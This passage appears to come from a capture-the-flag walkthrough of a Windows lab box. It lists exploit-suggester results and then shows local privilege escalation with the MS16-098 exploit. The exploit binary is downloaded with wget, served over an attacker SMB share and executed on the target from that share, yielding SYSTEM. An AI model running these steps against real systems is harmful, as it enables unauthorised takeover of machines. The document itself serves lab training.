+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows &lt;span class="m"&gt;7&lt;/span&gt; - WebDAV Privilege Escalation Exploit &lt;span class="o"&gt;(&lt;/span&gt;MS16-016&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows &lt;span class="m"&gt;7&lt;/span&gt; SP1 x86 - WebDAV Privilege Escalation &lt;span class="o"&gt;(&lt;/span&gt;MS16-016&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; MS16-014: Security Update &lt;span class="k"&gt;for&lt;/span&gt; Microsoft Windows to Address Remote Code Execution &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3134228&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Important
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   Windows &lt;span class="m"&gt;7&lt;/span&gt; SP1 x86 - Privilege Escalation &lt;span class="o"&gt;(&lt;/span&gt;MS16-014&lt;span class="o"&gt;)&lt;/span&gt;, https://www.exploit-db.com/exploits/40039/, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; MS16-007: Security Update &lt;span class="k"&gt;for&lt;/span&gt; Microsoft Windows to Address Remote Code Execution &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3124901&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Important
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load&lt;span class="o"&gt;()&lt;/span&gt; - Heap Corruption Buffer Underflow &lt;span class="o"&gt;(&lt;/span&gt;MS16-007&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll &lt;span class="o"&gt;(&lt;/span&gt;MS-16-007&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; MS15-132: Security Update &lt;span class="k"&gt;for&lt;/span&gt; Microsoft Windows to Address Remote Code Execution &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3116162&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Important
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll &lt;span class="o"&gt;(&lt;/span&gt;MS15-132&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting &lt;span class="o"&gt;(&lt;/span&gt;MS15-134&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; MS15-112: Cumulative Security Update &lt;span class="k"&gt;for&lt;/span&gt; Internet Explorer &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3104517&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Critical
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer &lt;span class="m"&gt;9&lt;/span&gt;/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read &lt;span class="o"&gt;(&lt;/span&gt;MS15-112&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; MS15-111: Security Update &lt;span class="k"&gt;for&lt;/span&gt; Windows Kernel to Address Elevation of Privilege &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3096447&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Important
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/38474/ -- Windows &lt;span class="m"&gt;10&lt;/span&gt; Sandboxed Mount Reparse Point Creation Mitigation Bypass &lt;span class="o"&gt;(&lt;/span&gt;MS15-111&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3089657&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Important
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3089656&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Critical
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/38198/ -- Windows &lt;span class="m"&gt;10&lt;/span&gt; Build &lt;span class="m"&gt;10130&lt;/span&gt; - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;M&lt;span class="o"&gt;]&lt;/span&gt; MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3079904&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Critical
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3050514&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Important
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC &lt;span class="o"&gt;(&lt;/span&gt;MS15-052&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;M&lt;span class="o"&gt;]&lt;/span&gt; MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3057191&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Important
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3036220&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Critical
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows &lt;span class="m"&gt;8&lt;/span&gt;.1 - win32k Local Privilege Escalation &lt;span class="o"&gt;(&lt;/span&gt;MS15-010&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation &lt;span class="o"&gt;(&lt;/span&gt;MS15-010&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation &lt;span class="o"&gt;(&lt;/span&gt;MS15-010&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3023266&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Important
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   http://www.exploit-db.com/exploits/35661/ -- Windows &lt;span class="m"&gt;8&lt;/span&gt;.1 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;32&lt;/span&gt;/64 bit&lt;span class="o"&gt;)&lt;/span&gt; - Privilege Escalation &lt;span class="o"&gt;(&lt;/span&gt;ahcache.sys/NtApphelpCacheControl&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3011780&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Critical
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege &lt;span class="o"&gt;(&lt;/span&gt;MS14-068&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;M&lt;span class="o"&gt;]&lt;/span&gt; MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3011443&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Critical
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA &lt;span class="o"&gt;(&lt;/span&gt;HTML Application&lt;span class="o"&gt;)&lt;/span&gt; - Remote Code Execution &lt;span class="o"&gt;(&lt;/span&gt;MS14-064&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc &lt;span class="o"&gt;(&lt;/span&gt;MS14-064&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer &amp;lt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt; - OLE Automation Array Remote Code Execution &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="c1"&gt;#1), PoC&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer &amp;lt; &lt;span class="m"&gt;11&lt;/span&gt; - OLE Automation Array Remote Code Execution &lt;span class="o"&gt;(&lt;/span&gt;MSF&lt;span class="o"&gt;)&lt;/span&gt;, MSF
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;M&lt;span class="o"&gt;]&lt;/span&gt; MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3000869&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Important
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution &lt;span class="s1"&gt;&amp;#39;Sandworm&amp;#39;&lt;/span&gt; Exploit &lt;span class="o"&gt;(&lt;/span&gt;MS14-060&lt;span class="o"&gt;)&lt;/span&gt;, PoC
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;M&lt;span class="o"&gt;]&lt;/span&gt; MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3000061&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Critical
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt;   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; 
+&lt;span class="o"&gt;[&lt;/span&gt;E&lt;span class="o"&gt;]&lt;/span&gt; MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2880430&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Important
+&lt;span class="o"&gt;[&lt;/span&gt;M&lt;span class="o"&gt;]&lt;/span&gt; MS13-090: Cumulative Security Update of ActiveX Kill Bits &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;2900986&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; - Critical
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="k"&gt;done&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;There's a whole lot here to digest with this output.&lt;/p&gt;
+&lt;h3&gt;# User -&amp;gt; Administrator: Exploiting MS16-098&lt;/h3&gt;
+&lt;p&gt;The MS16-098 exploit seems promising upon analysis and exploit db has a direct link to a pre-compiled executable. We can download that and attempt to exploit the box with it.&lt;/p&gt;
+&lt;p&gt;We start by downloading this to the attacking machine, then starting the SMB server again (if you closed it).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe&lt;/span&gt;
+--2020-05-03 &lt;span class="m"&gt;14&lt;/span&gt;:32:23--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
+Resolving github.com &lt;span class="o"&gt;(&lt;/span&gt;github.com&lt;span class="o"&gt;)&lt;/span&gt;... &lt;span class="m"&gt;192&lt;/span&gt;.30.255.113
+Connecting to github.com &lt;span class="o"&gt;(&lt;/span&gt;github.com&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="m"&gt;192&lt;/span&gt;.30.255.113&lt;span class="p"&gt;|&lt;/span&gt;:443... connected.
+HTTP request sent, awaiting response... &lt;span class="m"&gt;302&lt;/span&gt; Found
+Location: https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/41020.exe &lt;span class="o"&gt;[&lt;/span&gt;following&lt;span class="o"&gt;]&lt;/span&gt;
+--2020-05-03 &lt;span class="m"&gt;14&lt;/span&gt;:32:24--  https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/41020.exe
+Resolving raw.githubusercontent.com &lt;span class="o"&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class="o"&gt;)&lt;/span&gt;... &lt;span class="m"&gt;151&lt;/span&gt;.101.188.133
+Connecting to raw.githubusercontent.com &lt;span class="o"&gt;(&lt;/span&gt;raw.githubusercontent.com&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;|&lt;/span&gt;&lt;span class="m"&gt;151&lt;/span&gt;.101.188.133&lt;span class="p"&gt;|&lt;/span&gt;:443... connected.
+HTTP request sent, awaiting response... &lt;span class="m"&gt;200&lt;/span&gt; OK
+Length: &lt;span class="m"&gt;560128&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;547K&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;application/octet-stream&lt;span class="o"&gt;]&lt;/span&gt;
+Saving to: ‘41020.exe’
+
+&lt;span class="m"&gt;41020&lt;/span&gt;.exe                                                                      &lt;span class="m"&gt;100&lt;/span&gt;%&lt;span class="o"&gt;[===================================================================================================================================================================================================&lt;/span&gt;&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="m"&gt;547&lt;/span&gt;.00K  &lt;span class="m"&gt;1&lt;/span&gt;.99MB/s    in &lt;span class="m"&gt;0&lt;/span&gt;.3s    
+
+&lt;span class="m"&gt;2020&lt;/span&gt;-05-03 &lt;span class="m"&gt;14&lt;/span&gt;:32:25 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.99 MB/s&lt;span class="o"&gt;)&lt;/span&gt; - ‘41020.exe’ saved &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="m"&gt;560128&lt;/span&gt;/560128&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;span class="c1"&gt;# /usr/bin/impacket-smbserver -smb2support share .&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Then all we need to do is run execute the exploit; we can do so without touching disk by executing directly from the SMB share like so:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;kostas&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Documents&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;\\&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="k"&gt;share&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="mi"&gt;41020&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt;
+&lt;span class="err"&gt;\\&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="k"&gt;share&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="mi"&gt;41020&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt;
+&lt;span class="n"&gt;Microsoft&lt;/span&gt; &lt;span class="n"&gt;Windows&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="k"&gt;Version&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;9600&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="mi"&gt;2013&lt;/span&gt; &lt;span class="n"&gt;Microsoft&lt;/span&gt; &lt;span class="n"&gt;Corporation&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="k"&gt;All&lt;/span&gt; &lt;span class="n"&gt;rights&lt;/span&gt; &lt;span class="n"&gt;reserved&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+
+&lt;span class="k"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;kostas&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Documents&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;whoami&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;hostname&lt;/span&gt;
+&lt;span class="n"&gt;whoami&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;hostname&lt;/span&gt;
+&lt;span class="n"&gt;nt&lt;/span&gt; &lt;span class="n"&gt;authority&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="k"&gt;system&lt;/span&gt;
+&lt;span class="n"&gt;optimum&lt;/span&gt;
+
+&lt;span class="k"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;kostas&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Documents&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;dir&lt;/span&gt; &lt;span class="k"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Administrator&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Desktop&lt;/span&gt;
+&lt;span class="n"&gt;dir&lt;/span&gt; &lt;span class="k"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Administrator&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Desktop&lt;/span&gt;
+ &lt;span class="n"&gt;Volume&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;drive&lt;/span&gt; &lt;span class="k"&gt;C&lt;/span&gt; &lt;span class="n"&gt;has&lt;/span&gt; &lt;span class="k"&gt;no&lt;/span&gt; &lt;span class="n"&gt;label&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
+ &lt;span class="n"&gt;Volume&lt;/span&gt; &lt;span class="nb"&gt;Serial&lt;/span&gt; &lt;span class="nb"&gt;Number&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="n"&gt;D0BC&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;0196&lt;/span&gt;
+
+ &lt;span class="n"&gt;Directory&lt;/span&gt; &lt;span class="k"&gt;of&lt;/span&gt; &lt;span class="k"&gt;C&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Users&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Administrator&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;Desktop&lt;/span&gt;
+
+&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;03&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;2017&lt;/span&gt;  &lt;span class="mi"&gt;03&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;     &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;DIR&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;          &lt;span class="p"&gt;.&lt;/span&gt;
+&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;03&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;2017&lt;/span&gt;  &lt;span class="mi"&gt;03&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;     &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;DIR&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;          &lt;span class="p"&gt;..&lt;/span&gt;
